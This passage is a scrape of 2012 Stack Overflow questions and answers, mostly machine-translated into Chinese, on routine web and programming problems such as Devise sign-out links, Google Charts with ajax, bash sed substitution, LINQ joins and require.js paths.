21206-974 to 21206-5196 (overlapping since page 974 lies between parameter range)
--
21206-1974 to 21206-5196 (not overlapping)

21207-74 to 21207-193 (not overlapping)

21204-71 to 21205-100   (overlapping since page 100 lies between parameter range)
--
21205-31-21205-59 (overlapping)
--

```

Now I need to get the all overlapping from list range. Please help me.

Regards Arun Bhandari

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-01T03:24:33.907

如果页码在列表中，您始终可以执行联合声明。

# ruby-on-rails - 我可以使用 :method => :delete 和 url_for() 吗？

> ID：11751833
> 
> 赞同：1
> 
> 时间：2012-08-01T02:35:11.520
> 
> 标签：ruby-on-rails, devise

我正在使用 Devise 进行身份验证并在注销的下拉列表中创建一个项目。这就是我构建它的方式：

```
<a href="<%= url_for(destroy_user_session_path) %>"><span data-icon="&#xe040;" /> Sign Out</a> 
```

我正在使用图标字体在文本左侧粘贴一个漂亮的小图像。对于 Devise，它使用 DELETE 动词来表示`destroy_user_session_path`路由。大多数人会使用 button_to 或 link_to 但我认为这对我不起作用。使用 link_to 会自动插入结束标签，这将不允许我放入 span 标签。有没有办法让我建立上述链接并使用 DELETE 动词？

现在我正在使用[这个线程](https://stackoverflow.com/questions/6557311/no-route-matches-users-sign-out-devise-rails-3)中的解决方案。特别是在 devise.rb 中将 config.sign_out_via = :delete 更改为 config.sign_out_via = :get。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-01T02:58:48.593

只需添加`data-method="delete"`到您的链接标签。这就是`link_to`你调用它时的作用`:method => :delete`。剩下的工作由 JQuery 完成。

```
<a href="<%= url_for(destroy_user_session_path) %>" data-method="delete"><span data-icon="&#xe040;" /> Sign Out</a> 
```

# php - jQuery/php determine which button triggered a form

> ID：11751835
> 
> 赞同：1
> 
> 时间：2012-08-01T02:35:26.790
> 
> 标签：php, jquery, forms

I am trying to send to php the result of an ajax form, however which button was pressed (submit or cancel) is important to the php code, but is lost during the ajax. I am trying to uncover which button was pressed to submit the form, but my code is not working.

Can someone point out what is going wrong here?

```
$('.form').live('submit', function(event) {

    var messageTo = $(this).next();
    var button = event.target;
    var data = $(this).serialize();

    data = data + "&" + button.name + "=" + button.value;

    $.post(
        'a.php',
        data,
        function(data){
                messageTo.html(data.message);               
        }, "json"
    );

    return false;

}); 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-01T02:45:14.770

此行应该为您提供触发事件的元素

```
var button = event.target.nodeName; 
```

# python - 将文件从列表拖到桌面python

> ID：11751836
> 
> 赞同：0
> 
> 时间：2012-08-01T02:35:41.570
> 
> 标签：python, drag-and-drop, wxpython

我正在编写文件管理，其中一项 UI 功能是允许用户将列表中的项目拖动到桌面文件夹或只是桌面。谷歌搜索后，我发现只有拖入 wxpython 支持的列表，但没有关于我的问题的相关文章。是否有任何可能的解决方案或任何支持此功能的其他库？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-01T18:21:45.847

我花了一点谷歌搜索，但我找到了答案：[http ://wxpython-users.1045709.n5.nabble.com/Creating-file-DropSource-programatically-td2344103.html](http://wxpython-users.1045709.n5.nabble.com/Creating-file-DropSource-programatically-td2344103.html)

奇怪的是，它说 AddFile 方法仅在文档中是 Windows，但我无法弄清楚这是否真的如此。无论如何，这是一个基于您给出的原始示例的简单示例：

```
import wx
import os
import time

class MyListCtrl(wx.ListCtrl):
    def __init__(self, parent, id):
        wx.ListCtrl.__init__(self, parent, id, style=wx.LC_REPORT)

        files = os.listdir('.')

        self.InsertColumn(0, 'Name')
        self.InsertColumn(1, 'Ext')
        self.InsertColumn(2, 'Size', wx.LIST_FORMAT_RIGHT)
        self.InsertColumn(3, 'Modified')

        self.SetColumnWidth(0, 220)
        self.SetColumnWidth(1, 70)
        self.SetColumnWidth(2, 100)
        self.SetColumnWidth(3, 420)

        j = 0
        for i in files:
            (name, ext) = os.path.splitext(i)
            ex = ext[1:]
            size = os.path.getsize(i)
            sec = os.path.getmtime(i)
            self.InsertStringItem(j, "%s%s" % (name, ext))
            self.SetStringItem(j, 1, ex)
            self.SetStringItem(j, 2, str(size) + ' B')
            self.SetStringItem(j, 3, time.strftime('%Y-%m-%d %H:%M', 
                                                   time.localtime(sec)))

            if os.path.isdir(i):
                self.SetItemImage(j, 1)
            elif ex == 'py':
                self.SetItemImage(j, 2)
            elif ex == 'jpg':
                self.SetItemImage(j, 3)
            elif ex == 'pdf':
                self.SetItemImage(j, 4)
            else:
                self.SetItemImage(j, 0)

            if (j % 2) == 0:
                self.SetItemBackgroundColour(j, '#e6f1f5')
            j = j + 1

class FileHunter(wx.Frame):
    def __init__(self, parent, id, title):
        wx.Frame.__init__(self, parent, -1, title)
        panel = wx.Panel(self)

        p1 = MyListCtrl(panel, -1)
        p1.Bind(wx.EVT_LIST_BEGIN_DRAG, self.onDrag)
        sizer = wx.BoxSizer()
        sizer.Add(p1, 1, wx.EXPAND)
        panel.SetSizer(sizer)

        self.Center()
        self.Show(True)

    #----------------------------------------------------------------------
    def onDrag(self, event):
        """"""
        data = wx.FileDataObject()
        obj = event.GetEventObject()
        id = event.GetIndex()
        filename = obj.GetItem(id).GetText()
        dirname = os.path.dirname(os.path.abspath(os.listdir(".")[0]))
        fullpath = str(os.path.join(dirname, filename))

        data.AddFile(fullpath)

        dropSource = wx.DropSource(obj)
        dropSource.SetData(data)
        result = dropSource.DoDragDrop()
        print fullpath

app = wx.App(0)
FileHunter(None, -1, 'File Hunter')
app.MainLoop() 
```

在 Windows 7、Python 2.6 和 wxPython 2.8.12.1 上测试

# r - 如果未修改参数，R 编译器是否会按引用传递？

> ID：11751841
> 
> 赞同：2
> 
> 时间：2012-08-01T02:36:47.467
> 
> 标签：r, constants, pass-by-reference

在玩大型对象时，按值传递对内存和速度的影响可能很大。

R 有[几种](https://stackoverflow.com/questions/2603184/r-pass-by-reference)传递引用的方法：

*   参考类
*   罗
*   C/C++/其他外部语言
*   环境

但是，它们中的许多都需要相当大的开销（在代码复杂性和程序员时间方面）。

特别是，我正在设想类似你可以在 C++ 中使用常量引用的东西：传递一个大对象，在不修改的情况下对其进行计算，然后返回该计算的结果。

由于 R 没有常量的概念，我怀疑如果这种情况发生在任何地方，它是在编译的 R 函数中，编译器可以看到形式参数在代码中的任何地方都没有被修改并通过引用传递它。

如果未修改参数，R 编译器是否会按引用传递？如果没有，这样做是否存在任何技术障碍，还是尚未实施？

* * *

示例代码：

```
n <- 10^7
bigdf <- data.frame( x=runif(n), y=rnorm(n), z=rt(n,5) )
myfunc <- function(dat) invisible(with( dat, x^2+mean(y)+sqrt(exp(z)) ))
library(compiler)
mycomp <- compile(myfunc)
tracemem(bigdf)
> myfunc(bigdf)
> # No object was copied!  Question is not necessary 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-01T04:40:04.370

This may be way off base for what you need, but what about wrapping the object in a closure? This function makes a function that knows about the object given to its parent, here I use the tiny `volcano` to do a very simple job.

```
mkFun <- function(x) {
    function(rownumbers) {
    rowSums(x[rownumbers , , drop = FALSE])
    }
}

fun <- mkFun(volcano)

fun(2)  ##1] 6493
fun(2:3)  ##[1] 6493 6626 
```

Now `fun` can get passed around by worker functions to do its job as it likes.

# php - 我可以在不请求的情况下从 URL 获取值吗？

> ID：11751844
> 
> 赞同：0
> 
> 时间：2012-08-01T02:37:09.597
> 
> 标签：php

> **可能重复：**
> [如何解析将 URL 存储在变量中的 URL GET 数据？](https://stackoverflow.com/questions/11408716/how-do-i-parse-url-get-data-having-the-url-stored-in-a-variable)

我可以在不请求页面（刷新）或按下链接的情况下从 URL 获取值吗？我需要`p`来自该 url的值

```
http://palestinianz.com/?page=person&p=Betty-Shamieh- 
```

在 Facebook 的 og:title 元标记中使用它

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-01T03:04:43.107

```
$url = parse_url("http://palestinianz.com/?page=person&p=Betty-Shamieh-");
parse_str($url['query'], $data);
$p = $data['p']; 
```

# php - 动态星期选择

> ID：11751845
> 
> 赞同：1
> 
> 时间：2012-08-01T02:37:17.163
> 
> 标签：php, jquery

我正在寻找一个动态的星期选择。

所以代码会识别今天是 8 月 1 日，所以......会像这样工作。

所以代码（我希望它如何执行）

```
<select id="selectday" name="selectday" tabindex="13">
<option value="">Please select Preferred Day</option>
<option value="">Today Wed 1st Aug</option>
<option value="">Thursday 2nd Aug</option>
<option value="">Friday 3rd Aug</option>
<option value="">Saturday 4th Aug</option>
<option value="">Sunday 5th Aug</option>
</select> 
```

如果可能的话，还想考虑一下，如果当前时间是 => 12.00pm，那么今天（作为一个选项变得不可用）

这有意义吗？

只是想知道是否有人见过这样的事情以及如何做到这一点？更喜欢 jquery，但我想 php 会很好。

我看到很多日期和时间选择器，特别是 Trents [https://github.com/trentrichardson/jQuery-Timepicker-Addon](https://github.com/trentrichardson/jQuery-Timepicker-Addon)

但我需要一些非常非常简单和轻量级的东西。

只需要显示 7 天阻止或 14 天阻止。如果星期天不是一个选项，我会更喜欢，但这不是一个主要问题。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-01T02:46:15.177

这样的事情应该让你开始......（[经过测试的例子](http://ideone.com/CksJy)）

```
<select id="selectday" name="selectday" tabindex="13">
<?php
    $IncludeToday = date("G") < 12;
    for($i=($IncludeToday?0:1);$i<=7;$i++) {
        $TargetDate = strtotime(date("Y-m-d") . " +{$i} day");
        print "<option value=\"" . date("Y-m-d", $TargetDate) . "\">" . date("l jS F", $TargetDate) . "</option>\n";
    }
?>
</select> 
```

这采用格式中的当前日期`Y-m-d`并用于`strtotime()`解析`+ n days`. 然后，我们输出一个具有正确显示格式和`y-m-d`值中机器可读的选项。

# wordpress - 需要帮助使用 mod_rewrite 根据查询字符串重定向某些 URL

> ID：11751847
> 
> 赞同：0
> 
> 时间：2012-08-01T02:37:43.903
> 
> 标签：wordpress, .htaccess, mod-rewrite, redirect

我有一个 WordPress 网站，需要根据查询字符串重定向一些 URL。

链接是`/?product_brand=brandname`

我需要将它们全部重定向到`/?product_bisbrand=brandname`

有人可以指出我正确的方向吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-01T02:53:19.783

尝试将其放在文档根目录中的 htaccess 文件中的适当位置：

```
RewriteEngine On
RewriteCond %{QUERY_STRING} (.*)product_brand=([^&]+)&?(.*)
RewriteRule ^(.*)$ /$1?%1product_bisbrand=%2&%3 [R=301,L] 
```

# css - 我的网站的光滑的白色背景

> ID：11751850
> 
> 赞同：1
> 
> 时间：2012-08-01T02:37:58.707
> 
> 标签：css

我正在尝试将我网站的背景颜色设置为有光泽的白色背景，与 Linkedin 或大多数新一代网站的背景颜色相同的外观和感觉。我试图`background-color: #fff;`在我的 CSS 文件中设置，但背景颜色仍然看起来很暗淡的白色。

有什么方法可以使背景颜色光滑和有光泽的白色？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-01T02:40:11.160

去这里： http: [//www.colorpicker.com/](http://www.colorpicker.com/)并选择你想要的颜色。

用那个替换你`background-color`的。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-08-01T02:46:29.560

在linkedIn 上，容器有`background-color:#fff`. 如何使它们有光泽？尝试在主体背景上添加一些其他的深色，然后白色容器会“更白”。例如，一组`background-color`to`body`或`#E2E2E2`任何其他深色。或者使用一些背景图片，比如 LinkedIn。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-08-01T02:59:49.530

是因为你`background color`，更换颜色并尝试，它会工作

# javascript - 带有ajax的谷歌图表

> ID：11751851
> 
> 赞同：2
> 
> 时间：2012-08-01T02:38:11.133
> 
> 标签：javascript, jquery, google-visualization

我看不到我错过了什么。我似乎无法使用一点 ajax 运行 Google 图表 api。我究竟做错了什么？

```
<html>
  <head>      
<script type="text/javascript" src="https://www.google.com/jsapi"></script>
<script type="text/javascript" src="jquery-1.7.2.min.js"></script>
<script type="text/javascript">
  google.load("visualization", "1", {packages:["corechart"]});
  google.setOnLoadCallback(drawChart);
  function drawChart() {
   var dataSet =  $.ajax({
        url: "phpdata.php",
            async: false            
    }).responseText;
    var data = google.visualization.arrayToDataTable([
    dataSet
    ]);

    var options = {
      title: 'Company Performance'
    };

    var chart = new google.visualization.LineChart(document.getElementById('chart_div'));
    chart.draw(data, options);
  }

</script>
</head>
<body>
      <div id="chart_div" style="width: 900px; height: 500px;"></div>
</body>
</html> 
```

我的 php 数据：

['年份', '固定资产'],

['2009', 1],

['2010', 1.2],

['2011', 1.6]

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-21T09:06:05.700

我不知道它是否会解决您的问题，我在渲染从 ajax 调用调用的部分时遇到了类似的问题。没有调用 drawChart 函数，这基本上意味着 setOnLoadCallback 没有按预期触发。为了克服这个问题，我修改了我的调用如下：

```
 google.load("visualization", "1", {packages:["corechart"]});
    //google.setOnLoadCallback(drawChart);
      $(function() {
        drawChart(); //works
      });
    function drawChart() {
   } 
```

所以基本上我离开了谷歌方法，并制作了我自己的自调用函数，每当页面呈现或 div 更新时都会调用它。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-02T00:25:19.583

问题可能与您的 ajax 调用有关：

```
<html>
  <head>      
<script type="text/javascript" src="https://www.google.com/jsapi"></script>
<script type="text/javascript" src="jquery-1.7.2.min.js"></script>
<script type="text/javascript">
  google.load("visualization", "1", {packages:["corechart"]});
  google.setOnLoadCallback(drawChart);
  function drawChart() {
   var dataSet =  [ ['year', 'fixedassets'],['2009', 1],['2010', 1.2],['2011', 1.6]];
    var data = google.visualization.arrayToDataTable(dataSet);
    var options = {
      title: 'Company Performance'
    };
    var chart = new google.visualization.LineChart(document.getElementById('chart_div'));
    chart.draw(data, options);
  }
</script>
</head>
<body>
      <div id="chart_div" style="width: 900px; height: 500px;"></div>
</body>
    </html> 
```

这有效，因此任何现有代码都不是问题。您的 ajax 调用格式使用了一堆折旧的 jQuery 调用，并且无法访问您的服务器，我无法对其进行测试，但您可以尝试以下操作：

```
<html>
  <head>      
<script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/1.7.2/jquery.min.js"></script>
<script type="text/javascript" src="https://www.google.com/jsapi"></script>
<script type="text/javascript">
  google.load("visualization", "1", {packages:["corechart"]});
  google.setOnLoadCallback(drawChart);
  function drawChart() {
   $.get("phpdata.php", function(response_data) {
            var data = google.visualization.arrayToDataTable([response_data]);
        var options = {
          title: 'Company Performance'
        };
        var chart = new google.visualization.LineChart(document.getElementById('chart_div'));
        chart.draw(data, options);
        });
  }

</script>
</head>
<body>
      <div id="chart_div" style="width: 900px; height: 500px;"></div>
</body> 
```

看看这是否有效。

我认为您遇到的问题是您有一个字符串：`"['year', 'fixedassets'], ['2009', 1], ['2010', 1.2], ['2011', 1.6]"`并且您希望将其评估为数组：`[['year', 'fixedassets'],['2009', 1],['2010', 1.2],['2011', 1.6]]`。解决此问题的简单但不安全的方法是使用`eval()`. 你会说：

```
$.get("phpdata.php", function(response_data) {
   var data = google.visualization.arrayToDataTable(eval('[' + response_data + ']'); 
```

只要您完全控制服务器，并且您没有收到任何可能从您的服务器发送的用户输入，这不是很好但可以正常工作。

这样做的“正确”方法是从您的服务器发送实际的 json，而不是发送您发送的内容，然后使用`JSON.parse(response_data)`.

# jquery - jQuery 对话框：可拖动属性不起作用

> ID：11751852
> 
> 赞同：0
> 
> 时间：2012-08-01T02:38:34.800
> 
> 标签：jquery, jquery-ui

我正在开发一个 jQuery 确认对话框。一切都很好，除了当我将可拖动属性设置为 false 时，对话框在 Chrome 和 Firefox 上仍然是可拖动的。下面是代码：

```
function ActionClick(url){
        $("#ConfirmDialog").dialog({
            autoOpen: false,
            modal: true,
            draggable: false,
            resizable: false,
            buttons: [
                {
                    text: "Yes",
                    click: function(){
                        location.href = url;
                    }
                },
                {
                    text: "No",
                    click: function(){
                        $(this).dialog("close");
                    }
                }
            ]
        });
        $("#ConfirmDialog").dialog("open");
    } 
```

这与我使用的旧版本的 jQuery 和 jQueryUI 有关吗？我正在使用 jQuery 1.5.1 和 jQueryUI 1.8.11。

非常感谢！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-01T03:19:44.873

此[**演示**](http://jsfiddle.net/ricardolohmann/yQrRx/)适用于`jQuery 1.4.4`和`jQuery ui 1.8.7`。
所以，这段代码没有错。

可能您有一个未发布的相关代码。

# bash - Bash 数组 + sed + html

> ID：11751854
> 
> 赞同：1
> 
> 时间：2012-08-01T02:39:19.927
> 
> 标签：bash

我需要更改 HTML 文件的价格，该文件搜索并将它们存储在数组中，但我必须更改并保存 /nuevo-focus.html

```
price=( `cat /home/delkav/info-sitioweb/html/productos/autos/nuevo-focus.html | grep -oiE '([$][0-9.]{1,7})'|tr '\n' ' '` )

 price2=( $90.880 $0 $920 $925 $930 $910 $800 $712 $27.220 $962 )
 sub (){
 for item in "${price[@]}"; do
    for x in ${price2[@]}; do
      sed s/$item/$x/g > /home/delkav/info-sitioweb/html/productos/autos/nuevo-focus.html
     done
 done
 }

 sub 
```

输出 "cat /home/.../nuevo-focus.html|grep -oiE '([$][0-9.]{1,7})'|tr '\n' ' '` )" 是...

```
$86.880 $0 $912 $908 $902 $897 $882 $812 $25.725 $715 
```

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-08-01T02:59:47.023

在`bash`变量中`$0`，通过`$9`引用正在运行的脚本的相应命令行参数。在行中：

```
price2=( $90.880 $0 $920 $925 $930 $910 $800 $712 $27.220 $962 ) 
```

它们将扩展为空字符串或您为脚本提供的命令行参数。

尝试这样做：

```
price2=( '$90.880' '$0' '$920' '$925' '$930' '$910' '$800' '$712' '$27.220' '$962' ) 
```

* * *

编辑问题的第二部分

如果您尝试对该`sed`行执行的操作是替换文件中的价格，覆盖旧价格，那么您应该这样做：

```
sed -i  s/$item/$x/g /home/delkav/info-sitioweb/html/productos/autos/nuevo-focus.html 
```

这将在原地 ( ) 执行替换`-i`，修改输入文件。

* * *

编辑问题的第三部分

我刚刚意识到您的嵌套循环并没有真正的意义。我假设您想要做的是用`price`相应的价格替换每个价格`price2`

如果是这种情况，那么您应该使用单个循环，遍历数组的索引：

```
for i in ${!price[*]}
do
    sed -i  "s/${price[$i]}/${price2[$i]}/g" /home/delkav/info-sitioweb/html/productos/autos/nuevo-focus.html
done 
```

我现在无法测试它，但我认为它应该可以完成你想要的。

稍微解释一下：

`${!price[*]}`为您提供数组的所有索引（例如`0 1 2 3 4 ...`）

然后，对于每个指数，我们将相应的旧价格替换为新价格。不需要像您所做的那样使用嵌套循环。当你执行它时，你基本上在做的是：

```
replace every occurence of "foo" with "bar"
# at this point, there are now no more occurences of "foo" in your file
# so all of the other replacements do nothing
replace every occurence of "foo" with "baz"
replace every occurence of "foo" with "spam"
replace every occurence of "foo" with "eggs"
replace every occurence of "foo" with "qux"
replace every occurence of "foo" with "whatever"
etc... 
```

# sql - 抑制插入触发器的结果

> ID：11751855
> 
> 赞同：0
> 
> 时间：2012-08-01T02:39:20.900
> 
> 标签：sql, sql-server, triggers, nocount

MS SQL 插入触发器在返回结果时会引起一些麻烦。有没有办法禁止发送任何结果？我用过'set nocount on'，但这似乎没有多大作用......

```
create trigger tr_insert_raw_data
on raw_data
instead of insert
as
begin
 set nocount on

 declare @query varchar(max);
 declare @rev int;
 declare @id int;
 declare @oldrev int;
 declare @contextinfo VARBINARY(128)  

 select @contextinfo = context_info()
 if @contextinfo = 0x00001
 begin
  insert into raw_data select * from inserted
  return
 end

 select * into #query from inserted
 set @id = (select count(distinct id) from raw_data);
 set @id += 1;
 insert into revisions (username, hostname, ts) values (SYSTEM_USER, HOST_NAME(), GETDATE())
 set @rev = (select max(id) from revisions);

 select @oldrev = revision_id from inserted;
 if @oldrev is null set @oldrev=@rev-1;

 select * into #inserted from inserted
 update #inserted set revision_id = @rev, id = @id
 select * from #inserted
 insert into raw_data select * from #inserted
 insert into edges (a, b) values (@oldrev, @rev)
end 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-01T03:45:10.067

你得到什么样的结果？在快速查看您的查询后，我的第一个想法是您得到的结果是由于

```
select * from #inserted 
```

您拥有的行（从底部开始的第三行）。这条线告诉我您正在请求结果，这可能是您得到一些结果的原因？

如果您确实需要从表中选择值来修改或自定义选择，也许 CTE 会帮助您？（[公用表表达式](http://msdn.microsoft.com/en-us/library/ms190766%28v=sql.105%29.aspx)）

# c# - 如何从两个 ID 不匹配的列表中选择项目

> ID：11751858
> 
> 赞同：4
> 
> 时间：2012-08-01T02:39:42.887
> 
> 标签：c#, linq

好的，所以我有两个不同类型的项目列表。

```
var whales = new List<Whale>();

var crabs = new List<Crab>(); 
```

所以他们都有 id 属性。因此，保存列表的对象 ID 为：

鲸鱼：1、3、4、5 螃蟹：1、2、3、4

好的，所以我有一个查询：

```
var matchedPairs = from c in crabs
                   from w in whales
                   where c.Id = w.Id
                   select new { crab = c, whale = w }; 
```

因此，这对于获取匹配项非常有效。我遇到麻烦的地方是我想获得一份没有匹配鲸鱼的螃蟹列表，即。Crab Id = 2。然后我想得到没有匹配螃蟹的鲸鱼，即 Whale Id = 5。

谁能告诉我如何编写这些查询？

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2012-08-01T02:57:52.200

如果您只想选择螃蟹。

```
var result = crabs.Where(c => whales.All(w => w.Id != c.Id)); 
```

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-08-01T02:51:47.977

也许是这样的：

```
var unmatchedCrabs = from c in crabs
                     where !whales.Any(w => w.Id == c.Id)
                     select c; 
```

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-08-01T03:09:38.990

你想要一个[外部连接](http://msdn.microsoft.com/en-us/library/bb397895.aspx)：

```
var crabsWithoutWhales = from c in crabs
                         join w1 in whales on c.Id equals w1.Id into ws
                         from w2 in ws.DefaultIfEmpty()
                         where w2 == null
                         select c; 
```

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-08-01T02:56:39.777

您可以使用集合[操作中的](http://msdn.microsoft.com/en-us/library/bb546153.aspx)[联合](http://msdn.microsoft.com/en-us/library/bb341731.aspx)操作。

要使用它，您必须覆盖默认的[Equality 比较器和 GetHashCode 方法](http://msdn.microsoft.com/en-us/library/ms173147%28v=vs.80%29.aspx)。一旦你有了这些，你就可以做这样的事情：

```
var matchedPair = crabs.Union(whales); 
```

在您的情况下，您应该有一个基类；例如具有平等比较器的动物。另一种选择是实施[IEqualityComparer<>](https://stackoverflow.com/questions/98033/wrap-a-delegate-in-an-iequalitycomparer)

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-08-01T03:06:00.520

```
var result = crabs.SelectMany(c => whales, (c, w) => new { c, w })
                              .Where(@t => whales.All(x => x.Id != t.c.Id) && crabs.All(x => x.Id != t.w.Id))
                              .Select(@t => new {crab = @t.c, whale = @t.w}); 
```

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2012-08-01T03:10:47.417

这是我能想到的最整洁的 LINQ，可以满足您的需求：

```
var whalesOnly =
    from w in whales
    join c in crabs on w.Id equals c.Id into gcs
    where !gcs.Any()
    select w;

var crabsOnly =
    from c in crabs
    join w in whales on c.Id equals w.Id into gws
    where !gws.Any()
    select c; 
```

这些看起来如何？

顺便说一句，您可以像这样更好地执行连接查询：

```
var whalesAndCrabs =
    from whale in whales
    join crab in crabs on whale.Id equals crab.Id
    select new { crab, whale }; 
```

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2012-08-01T03:51:59.267

您需要两个通过[GroupJoin](http://msmvps.com/blogs/jon_skeet/archive/2011/01/01/reimplementing-linq-to-objects-part-22-groupjoin.aspx)方法进行的左连接，如下所示：

```
var result1 = whales.GroupJoin(crabs, w => w.ID, c => c.ID, (w,cs) => new {WhaleID = w.ID, Matches = cs});
var result2 = crabs.GroupJoin(whales, c => c.ID, w => w.ID, (c, ws) => new {CrabID = c.ID, Matches = ws}); 
```

然后，按您想要的过滤结果。

# case - PostgreSQL CASE 语句语法错误

> ID：11751863
> 
> 赞同：2
> 
> 时间：2012-08-01T02:40:29.537
> 
> 标签：case, postgresql-9.1

我正在尝试按照 PostgreSQL 手册中的说明进行操作。 [PostgreSQL：文档：9.1：控制结构](http://www.postgresql.org/docs/9.1/static/plpgsql-control-structures.html) 我的 PostgreSQL 服务器是 Windows 32 位上的 9.1.14 版。

以下 SQL 语句意外导致语法错误：

```
SELECT
  CASE 1
    WHEN 1,2 THEN 'x'
    ELSE 'y'
  END; 
```

我期待它返回'x'；

然而，更传统的代码运行良好：

```
SELECT
  CASE 1
    WHEN 1 THEN 'x'
    WHEN 2 THEN 'x'
    ELSE 'y'
  END; 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-08-01T07:10:10.443

您正在使用`CASE`过程语言提供的语法`plpgsql`。这与*SQL*语法*相似*但不完全相同。这是 SQL 版本的链接。 *`CASE`[`CASE`](http://www.postgresql.org/docs/9.1/static/functions-conditional.html)*

 *在这里你看，这`1,2`是不允许的，只有一个普通的`expression`. 所以你可以写：

```
SELECT
  CASE 
    WHEN 1 in (1,2) THEN 'x'
    ELSE 'y'
  END; 
```*

# ruby - 如何将我的 Facebook 应用程序限制为仅来自美国的用户？

> ID：11751864
> 
> 赞同：0
> 
> 时间：2012-08-01T02:40:40.503
> 
> 标签：ruby, facebook, location

我正在使用 ruby​​ + sinatra 和 koala gem 来制作一个 facebook iframe 应用程序。我想找出每个用户在哪里，如果他们在美国境外，则不允许他们访问我的应用程序。
要求 user_location 权限只会向我返回一个城市，而不是一个国家，并且也可以由用户在他们的 facebook 设置中设置。

谢谢！

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-01T02:47:26.637

您可以在应用程序的高级设置中更改此设置。

将您的应用程序 ID 插入下面显示“YOUR_APP_ID”的 URL [https://developers.facebook.com/apps/YOUR_APP_ID/advanced](https://developers.facebook.com/apps/YOUR_APP_ID/advanced)

# javascript - 我不明白 require.js 如何处理加载路径。每次定义模块时都需要使用 require.config 吗？

> ID：11751865
> 
> 赞同：2
> 
> 时间：2012-08-01T02:40:43.927
> 
> 标签：javascript, amd

我正在学习 require.js 并认为我只是错过了一些东西。我不明白它如何加载文件。

我在 lib 目录中有我的 jquery 文件。

这不起作用：

它显示 jquery 正在加载到 chrome 网络面板中。错误是：Uncaught TypeError: undefined is not a function 。所以基本上是说 $ 是未定义的。

```
require(['lib/jquery'],function($) {
  $(document).ready(function(){
    alert('hello');
  });
}); 
```

这有效：

```
require.config({
    paths: {
        jquery: 'lib/jquery'
    }
});

require(['jquery'],function($) {
      $(document).ready(function(){
      alert('hello');
    });

}); 
```

在我在网上看到的其他示例中，您不必使用 require.config 设置路径。每次我想定义一个模块时都必须这样做吗？我知道在这种情况下我使用的是 require 而不是 define，但是我在使用 define 方法时遇到了同样的问题。每次我使用define 制作模块时，我都必须使用require.config() 设置路径。我想我在这里遗漏了一些东西。谁能指出我正确的方向？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-01T04:32:23.950

这是对 jquery 完成的 AMD 注册的约束。它显式注册为名为“jquery”的命名模块，因此您必须为其配置路径，或者在上述情况下，将 baseUrl 设置为“lib”，然后您不需要路径配置。

其他库通常应该使用匿名模块注册，因此您不需要为每个库进行路径配置。[更多细节在这里](https://github.com/jrburke/requirejs/wiki/Updating-existing-libraries#wiki-anon)。

此外，一些库，如 underscore，不直接调用 define()，但您可以通过使用[shim config](http://requirejs.org/docs/api.html#config-shim)获得一定程度的支持。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-01T03:42:05.443

更新以反映评论和[詹姆斯的回答](https://stackoverflow.com/a/11752596/781)：

你有两个问题：

1.  由于詹姆斯在他的回答中概述的原因，jQuery 要求您在配置中进行`paths`设置，或者在您概述的代码中设置`baseUrl`为“lib”。

2.  您必须记住，您不能只使用 RequireJS 加载任何旧脚本。只能加载符合 AMD 标准的脚本。

话虽如此，我建议您改用[require-jquery](https://stackoverflow.com/a/11752596/781)。

您可能最终会使用 jQuery 插件，这些插件会假定 jQuery 已加载到页面上，而这些插件不适用于您尝试的方法。

# javascript - 从 asp.net mvc 3 调用函数到 nailthumb

> ID：11751866
> 
> 赞同：0
> 
> 时间：2012-08-01T02:40:45.993
> 
> 标签：javascript

我刚刚从[http://www.garralab.com/nailthumb.php](http://www.garralab.com/nailthumb.php)下载了 nailthumb 项目，但我不能从 js 的 asp.net mvc 3 调用这个函数。

示例中的函数调用如下：

```
 <script type="text/javascript">
   jQuery(document).ready(function() {
   jQuery('.nailthumb-container').nailthumb({
   width:100,height:100,method:'resize',fitDirection:'top left'});
   });
</script> 
```

我试过了：

```
<script type="text/javascript">
    $(document).ready(function () {
    $('#nailthumb-container').nailthumb({
       width: '100',
       height: '100' 
       });

   });
</script> 
```

js文件加载，但我不知道如何调用这个函数。有任何想法吗？

```
<script src="@Url.Content("~/Scripts/jquery.validate.min.js")" type="text/javascript"> </script>
<script src="@Url.Content("~/Scripts/jquery.validate.unobtrusive.min.js")" type="text/javascript"></script>
<script src="../../Scripts/jquery.nailthumb.1.1.js" type="text/javascript"></script>
<script src="../../Scripts/jquery.nailthumb.1.1.css" type="text/css"></script>
<script src="@Url.Content("~/Scripts/jquery-1.5.1.js")" type="text/javascript"></script>
<style type="text/css" media="screen">
    .square-thumb {
        width: 150px;
        height: 150px;
    }
</style>

<div class="nailthumb-container square-thumb">
 <img alt='' src='@Url.Action("Show", "ConsultorioImagenes", new { id = Model.ID})' />
</div> 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-01T02:53:58.327

当您为它分配一个类时，您正在使用 id 选择器 (#)。

这一行：

```
<div class="nailthumb-container square-thumb"> 
```

..分配 nail-thumb-container 类。您需要在 jQuery 调用中使用类选择器 (.)：

```
<script type="text/javascript">
    $(document).ready(function () {
